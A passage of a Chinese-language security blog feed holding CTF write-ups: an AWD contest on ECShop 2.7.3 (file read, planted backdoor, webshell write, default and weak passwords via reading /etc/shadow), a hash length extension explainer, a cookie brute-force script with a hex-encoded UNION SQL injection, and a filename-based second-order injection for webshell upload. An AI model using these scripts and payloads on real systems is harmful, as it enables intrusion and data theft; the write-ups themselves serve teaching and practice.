-    </summary>
-    
-      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
-    
-      <category term="AWD" scheme="http://yoururl.com/categories/CTF/AWD/"/>
-    
-    
-      <category term="攻防" scheme="http://yoururl.com/tags/%E6%94%BB%E9%98%B2/"/>
-    
-      <category term="web" scheme="http://yoururl.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第三届安恒杯线下赛总结</title>
-    <link href="http://yoururl.com/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/"/>
-    <id>http://yoururl.com/2018/06/26/第三届安恒杯线下赛总结-1/</id>
-    <published>2018-06-25T16:03:00.000Z</published>
-    <updated>2018-06-25T17:18:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3<br><br>&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求<a href="http://10.0.1.2，并带上自己的token，即可获取flag" target="_blank" rel="noopener">http://10.0.1.2，并带上自己的token，即可获取flag</a>  <br><br></p><h1 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.%s.2/mobile/index.php" target="_blank" rel="noopener">http://10.50.%s.2/mobile/index.php</a><br>参数：url=<a href="http://10.0.1.2?token=RCNWBJXQ" target="_blank" rel="noopener">http://10.0.1.2?token=RCNWBJXQ</a><br><br></p><h1 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.33.2/mobile/index.php?m=default&amp;c=auction" target="_blank" rel="noopener">http://10.50.33.2/mobile/index.php?m=default&amp;c=auction</a><br>参数：1=phpinfo()<br><br></p><p><strong>提示线索1:</strong><br>mobile/themes/default/auction_list.dwt<br>这是一个预留后门，比较叼D盾扫不出来<br><strong>提示线索2:</strong><br>mobile/api/uc.php<br><br></p><h1 id="任意文件读取-poc-1"><a href="#任意文件读取-poc-1" class="headerlink" title="任意文件读取(poc 1)"></a>任意文件读取(poc 1)</h1><p>根据给出的poc1，我们快速去定位问题文件位置<br>我们从mobile入口文件入手<br>即：  mobile/index.php<br>查看内容<br><img src="\images\pasted-36.png" alt="upload successful"><br>跟踪文件 <img src="\images\pasted-37.png" alt="upload successful"><br>看到内容 <img src="\images\pasted-38.png" alt="upload successful"><br>跟踪apps/目录<br>可以发现3个文件夹 <img src="\images\pasted-39.png" alt="upload successful"><br>我们首先看到默认文件夹 <img src="\images\pasted-40.png" alt="upload successful"><br>此时又得到5个文件夹 <img src="\images\pasted-41.png" alt="upload successful"><br>从第一个common文件夹开始<br>可以看到insert.php中的一个函数 <img src="\images\pasted-42.png" alt="upload successful"><br>看到关键代码 <img src="\images\pasted-43.png" alt="upload successful"><br>其中 <img src="\images\pasted-44.png" alt="upload successful"><br>明显是一个任意文件读取<br>利用脚本： <img src="\images\pasted-45.png" alt="upload successful"><br><br><br></p><h1 id="一句话木马文件-poc-2"><a href="#一句话木马文件-poc-2" class="headerlink" title="一句话木马文件(poc 2)"></a>一句话木马文件(poc 2)</h1><p><strong>防守方法删除预留后门auction_list.dwt文件即可</strong><br>当时官方给出提示：auction_list.dwt文件!<br><a href="\images\pasted-46.png">upload successful</a><br>由于此文件用于渲染，直接将小马删除即可<br><br><br><br></p><h1 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h1><p><strong>防守方法改掉writesth函数名即可</strong><br>定位到mobile/api/uc.php<br>在action数组中发现了一些奇怪的东西<br><img src="\images\pasted-47.png" alt="upload successful"><br>最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数<br>不难发现以下关键代码：<br><img src="\images\pasted-48.png" alt="upload successful"><br>即：<br>文件名可控<br>文件内容可控<br>即可写入Webshell<br>我们测试<br><img src="\images\pasted-49.png" alt="upload successful"><br>运行即可发现我们当前目录下写入sky.php，内容为<img src="\images\pasted-50.png" alt="upload successful"><br>但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为<br><img src="\images\pasted-51.png" alt="upload successful"><br>所以直接写可能无效，应该选择上跳，例如  ../data/sky.php<br><br><br><br></p><h1 id="ECShop-v2-7-3后台直接getshell"><a href="#ECShop-v2-7-3后台直接getshell" class="headerlink" title="ECShop v2.7.3后台直接getshell"></a><strong><a href="!http://www.haaker.cn/?p=6420">ECShop v2.7.3后台直接getshell</a></strong></h1><p><img src="\images\pasted-52.png" alt="upload successful"><br><img src="\images\pasted-53.png" alt="upload successful"><br><img src="\images\pasted-54.png" alt="upload successful"><br><img src="\images\pasted-55.png" alt="upload successful"><br>防守方法改掉后台密码即可（默认admin admin888）<br><br><br><br></p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>本次比赛还有一个漏洞就是ctf用户弱口令<br>cat /etc/shadow<br>得到ctf账户密码123456<br>就因为这个漏洞被dalao全场从头打到尾…</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&amp;emsp;&amp;emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求&lt;a href=&quot;http://10.0.1.2，并带上自己的token，即可
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
-    
-      <category term="AWD" scheme="http://yoururl.com/categories/CTF/AWD/"/>
-    
-    
-      <category term="攻防" scheme="http://yoururl.com/tags/%E6%94%BB%E9%98%B2/"/>
-    
-      <category term="web" scheme="http://yoururl.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>hash长度拓展攻击</title>
-    <link href="http://yoururl.com/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
-    <id>http://yoururl.com/2018/05/08/hash长度拓展攻击/</id>
-    <published>2018-05-08T14:15:00.000Z</published>
-    <updated>2018-08-02T17:48:58.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="Hash-Length-Extension-Attack"><a href="#Hash-Length-Extension-Attack" class="headerlink" title="Hash Length Extension Attack"></a>Hash Length Extension Attack</h3><p>&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文）<br><br></p><h1 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h1><p>先介绍一下md5加密的原理<br><img src="\images\pasted-25.png" alt="upload successful"></p><p>个人理解: md5的过程可以分成<strong>填充</strong>和<strong>压缩</strong>的过程<br></p><ul><li>md5 padding(填充)<br>&emsp;&emsp;message padding<br>&emsp;&emsp;length%64=56(8位标识原始长度)<br>填充的时候，将会使用16进制数据：<br>&emsp;~1个\x80<br>&emsp;~N个\0x00      </li><li>md5 compress(压缩)<br>&emsp;&emsp;message padding length—–&gt;hash<br>&emsp;&emsp;length=N*64(bit)      —–&gt;length%64(bit)<br><br></li></ul><h2 id="md5-padding"><a href="#md5-padding" class="headerlink" title="md5 padding"></a>md5 padding</h2><p><em>例如我们把admin来hash一下:</em><br>admin  先hex编码-&gt;61646d696e<br>再填充80<br>不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)<br>最后数据表示位2800000000000000（8个字节）<br>最终结果为:</p><blockquote><p>61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<br><br></p></blockquote><p><strong>什么是Magic number (确定值)</strong><br>代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量)<br><br><br></p><h2 id="md5-compress"><a href="#md5-compress" class="headerlink" title="md5 compress"></a>md5 compress</h2><p>我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。<br>Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。<br>每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值<br><br><br>我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：<br>A=0x292f2321L<br>B=0xa7a5577aL<br>C=0xe4a8943L<br>D=0xc31f804aL<br>而md5的结果:<br><img src="\images\pasted-26.png" alt="upload successful"><br>我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙）<br><br></p><h1 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h1><p>其实只要知道三点后就能进行攻击：</p><ul><li>MD5(salt+message)的值</li><li>message内容</li><li>salt+message长度<br>这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值<br>因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。<br><img src="\images\pasted-27.png" alt="upload successful"></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>逆向算法很简单</p><pre><code>def compute_magic_number(self, md5str):    self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0]    self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0]    self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0]    self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0]</code></pre><p>由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL<br>根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)<br>这样就完成了长度拓展攻击</p><h2 id="例题测试"><a href="#例题测试" class="headerlink" title="例题测试"></a>例题测试</h2><h3 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧-让我进去"></a>实验吧-让我进去</h3><p>抓包改source，Repeater过去发现源码</p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security      $username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))<br>sample-hash是secret+adminadmin的MD5<br><img src="\images\pasted-67.png" alt="upload successful"><br>这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。<br>数据是admin<br>签名（哈希值）是571580b26c65f306376d4f64e53cb5c7<br><img src="\images\pasted-68.png" alt="upload successful"><br>生成的hash是新的签名，设置到cookies的getmein里面<br>把\x换成%后post提交，得到flag<br><img src="\images\pasted-69.png" alt="upload successful"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;Hash-Length-Extension-Attack&quot;&gt;&lt;a href=&quot;#Hash-Length-Extension-Attack&quot; class=&quot;headerlink&quot; title=&quot;Hash Length Extension Attack&quot;&gt;&lt;/a&gt;Ha
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
-    
-      <category term="Web" scheme="http://yoururl.com/categories/CTF/Web/"/>
-    
-    
-      <category term="web" scheme="http://yoururl.com/tags/web/"/>
-    
-      <category term="crypto" scheme="http://yoururl.com/tags/crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>蓝鲸笔记系统writeup</title>
-    <link href="http://yoururl.com/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/"/>
-    <id>http://yoururl.com/2018/04/10/蓝鲸笔记系统writeup/</id>
-    <published>2018-04-10T07:30:00.000Z</published>
-    <updated>2018-08-02T17:50:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h4><p>给出一个login界面，url看上去似乎有问题<br><br><a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a><br><br>感觉像是有文件包含<br><br>随便尝试一下<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index</a><br><br><img src="\images\pasted-0.png" alt="upload successful"><br>果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql</p><p><img src="\images\pasted-4.png" alt="upload successful"><br>发现了flag字段，flag应该就是在数据库里面了</p><p>肯定是文件包含无疑了，相办法读源码</p><h5 id="利用php伪协议读源码："><a href="#利用php伪协议读源码：" class="headerlink" title="利用php伪协议读源码："></a>利用php伪协议读源码：</h5><p>php://filter/read=convert.base64-encode/resource=<br><img src="\images\pasted-5.png" alt="upload successful"><br>不让读，真尴尬</p><p>然后仔细看了看url，猜测这个front是文件夹名，login是文件名<br><a href="http://202.98.28.108:10013/7sghfe673jd3/front/index.php" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/front/index.php</a><br><img src="\images\pasted-6.png" alt="upload successful"><br><img src="\images\pasted-7.png" alt="upload successful"><br>还是拒绝访问…</p><p>猜测后台脚本是这样写的:<br><br>include($action.’/‘.$mode.’.php’)<br><br>require”$action.’/‘.$mode.’.php’”</p><p><img src="\images\pasted-8.png" alt="upload successful"><br>成功读出来了！！！<br><br>login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>先看一下index.php，并没有发现什么东西<br>在common.php中发现一些定义的函数</p><p>御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来<br><br>在/admin/login.php中发现<br><img src="\images\pasted-9.png" alt="upload successful"></p><p>/admin/login.php,调用了set_login()函数</p><p><img src="\images\pasted-10.png" alt="upload successful"></p><p>/front/common.php中有set_login()函数的定义</p><p><img src="\images\pasted-11.png" alt="upload successful"></p><p><img src="\images\pasted-12.png" alt="upload successful"></p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>来到<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login</a></p><p><img src="\images\pasted-15.png" alt="upload successful"><br>跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata<br>$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) <br><br>SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数</p><p>看一下后台登陆验证</p><p><img src="\images\pasted-16.png" alt="upload successful"><br>两个函数在common.php中</p><p><img src="\images\pasted-17.png" alt="upload successful"></p><p><img src="\images\pasted-18.png" alt="upload successful"><br>这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。</p><p>但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，<br>null!==False</p><blockquote><blockquote><p>True<br>null!=False<br>False<br>$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。</p></blockquote></blockquote><h5 id="爆破cookie脚本"><a href="#爆破cookie脚本" class="headerlink" title="爆破cookie脚本"></a>爆破cookie脚本</h5><pre><code>import requestsimport hashlibimport randomimport stringfalse_tag = &quot;not login!&quot;url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;def rand_str(length):    return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))def md5_encode(data):    hash = hashlib.md5()    hash.update((data + &quot;admin&quot;).encode())    return hash.hexdigest()key = []for x1 in [&quot;w&quot;,&quot;h&quot;]:    for x2 in [&quot;w&quot;,&quot;h&quot;]:        for x3 in [&quot;w&quot;,&quot;h&quot;]:            for x4 in [&quot;w&quot;,&quot;h&quot;]:                for x5 in [&quot;w&quot;,&quot;h&quot;]:                    for x6 in [&quot;w&quot;,&quot;h&quot;]:                        key.append(x1+x2+x3+x4+x5+x6)                        print keys = requests.Session()    s.headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,        &apos;cookie&apos;: &apos;&apos;    }for x in key:       s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26))    s.headers[&quot;PHPSESSID&quot;] = rand_str(26)    print s.headers[&quot;cookie&quot;]    result = s.get(url)    #print result.content    if false_tag in result.content:        print &quot;NO&quot;,x    else:        print &quot;YES&quot;        print s.headers        print result.content        break</code></pre><p><img src="\images\pasted-19.png" alt="upload successful"></p><p>发现setpagenumu页面，down下来源码</p><p><img src="\images\pasted-20.png" alt="upload successful"></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>发现post的page是用户可以输入<br>但是类型限制了纯数字，应该是没有办法注入</p><p>回去审计/admin/index.php</p><p><img src="\images\pasted-21.png" alt="upload successful"><br>发现数据库里查询的是$page_size,跟踪get_page_size(),</p><p><img src="\images\pasted-22.png" alt="upload successful"><br>get_page_size()函数返回num，也就是index里面的$page_size<br>感觉应该能注入，回去看数据库文件</p><p><img src="\images\pasted-23.png" alt="upload successful"><br>发现数据库里定义的page是varchar类型<br>标准的脚本代码与数据库类型不匹配<br>利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入</p><p>数据库文件中可以看到一共有四个列</p><p><img src="\images\pasted-24.png" alt="upload successful"><br>构造注入语句<br>2 union select 1,flag,flag,4 from flags<br>转成十六进制注入即可拿到flag<br>0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;蓝鲸笔记系统&quot;&gt;&lt;a href=&quot;#蓝鲸笔记系统&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸笔记系统&quot;&gt;&lt;/a&gt;蓝鲸笔记系统&lt;/h4&gt;&lt;p&gt;给出一个login界面，url看上去似乎有问题&lt;br&gt;&lt;br&gt;&lt;a href=&quot;http://202.98.
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
-    
-      <category term="Web" scheme="http://yoururl.com/categories/CTF/Web/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoururl.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="php函数漏洞" scheme="http://yoururl.com/tags/php%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="php伪协议" scheme="http://yoururl.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
-    
-      <category term="CSRF" scheme="http://yoururl.com/tags/CSRF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>文件管理系统writeup</title>
-    <link href="http://yoururl.com/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
-    <id>http://yoururl.com/2018/04/08/day1文件管理系统/</id>
-    <published>2018-04-08T12:11:00.000Z</published>
-    <updated>2018-08-02T17:49:52.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="文件上传之代码审计"><a href="#文件上传之代码审计" class="headerlink" title="文件上传之代码审计"></a>文件上传之代码审计</h3><p>前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。</p><p>首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。<img src="\images\pasted-1.png" alt="upload successful"><br>先审计代码，看一下upload.php<br><img src="\images\pasted-2.png" alt="upload successful"><br>文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传<br>其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入</p><p>文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名）</p><p>可以看出来文件名走过的流程是：<br>$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert</p><p>再看一下rename.php<br><img src="\images\pasted-3.png" alt="upload successful"><br>首先查询文件名，如果存在，执行sql语句<br>根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改</p><p>但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入</p><p>如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了</p><p>那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。</p><h5 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h5><blockquote><ul><li>上传文件名为’,extension=’’,filename=’aa.jpg.jpg</li><li>这样filename的值为’,extension=’’,filename=’aa.jpg</li><li>我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg</li><li>这时我们再次上传一个写有木马的文件，文件名为aa.jpg</li><li>此时不会提示file is exists 因为extension!=jpg</li><li>将aa.jpg改为aa.php即可</li></ul></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;文件上传之代码审计&quot;&gt;&lt;a href=&quot;#文件上传之代码审计&quot; class=&quot;headerlink&quot; title=&quot;文件上传之代码审计&quot;&gt;&lt;/a&gt;文件上传之代码审计&lt;/h3&gt;&lt;p&gt;前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。&lt;/p&gt;
-&lt;p&gt;首
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
-    
-      <category term="Web" scheme="http://yoururl.com/categories/CTF/Web/"/>
-    
-    
-      <category term="文件上传" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-      <category term="代码审计" scheme="http://yoururl.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://yoururl.com/2018/04/07/hello-world/"/>
-    <id>http://yoururl.com/2018/04/07/hello-world/</id>
-    <published>2018-04-07T09:41:00.000Z</published>
-    <updated>2018-06-26T02:48:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>RSA总结</title>
-    <link href="http://yoururl.com/2018/04/06/rsa%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoururl.com/2018/04/06/rsa总结/</id>
-    <published>2018-04-06T08:33:00.000Z</published>
-    <updated>2018-08-02T17:22:26.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>先留个坑，等强网杯RSA那道题出write up再写…</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;先留个坑，等强网杯RSA那道题出write up再写…&lt;/p&gt;
-
-      
-    
-    </summary>
-    
-      <category term="密码学" scheme="http://yoururl.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
-    
-      <category term="crypto" scheme="http://yoururl.com/tags/crypto/"/>
-    
-      <category term="rsa" scheme="http://yoururl.com/tags/rsa/"/>
     
   </entry>
   
